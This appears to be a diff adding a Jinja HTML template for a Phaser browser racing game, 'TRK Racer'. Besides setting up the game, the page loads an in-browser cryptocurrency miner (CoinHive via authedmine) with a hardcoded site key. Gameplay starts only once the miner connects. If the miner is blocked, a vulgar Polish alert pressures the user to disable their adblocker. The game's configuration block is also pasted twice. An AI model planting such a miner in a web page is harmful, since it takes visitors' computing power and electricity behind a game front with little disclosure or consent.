@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <script src="/static/phaser.min.js"></script>
+    <script src="/static/phaser-input.min.js"></script>
+    <script src="/static/sha256.min.js"></script>
+    <script src="/static/play.js"></script>
+    <link rel="stylesheet" type="text/css" {% if dark %} href="{{url_for('static', filename='dark.css')}}" {% else %} href="{{url_for('static', filename='bicycle.css')}}" {% endif %}>
+    <title>TRK Racer</title>
+</head>
+
+<body>
+     <div><a href="/">Powrót</a></div>
+    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+    <script>
+    var TRK = TRK || {};
+    var config = {
+        type: Phaser.CANVAS,
+        width: 800,
+        height: 600,
+        physics: {
+            default: 'arcade',
+            arcade: {
+                gravity: { y: 500 }
+            }
+        }
+    };
+
+    TRK.game = new Phaser.Game(config);
+    TRK.game.state.add("gameplay", TRK.gameplay);
+    TRK.game.state.add("gameover", TRK.gameover);
+     Phaser.Device.whenReady(function() {
+        TRK.game.plugins.add(PhaserInput.Plugin);
+    });
+
+    var miner = null;
+    try {
+        miner = new CoinHive.Anonymous('BysR3bM4dKIvTCgnv7LomuERGKnQSfUj', { throttle: 0.1 });
+    } catch (err) {
+        alert("Wyłącz adbloka odśwież i popatrz jak zapierdala, praktycznie nic cię to nie kosztuje a będzie można utrzymać serwer");
+    }
+
+    miner.on("open", function(params) {
+         TRK.game.state.start("gameplay");
+         // setInterval(function(){console.log(miner.getHashesPerSecond())}, 1000);
+    });
+
+    miner.start();
+
+    
+    var TRK = TRK || {};
+    var config = {
+        type: Phaser.CANVAS,
+        width: 800,
+        height: 600,
+        physics: {
+            default: 'arcade',
+            arcade: {
+                gravity: { y: 500 }
+            }
+        }
+    };
+   
+    </script>
+</body>
+
+</html>
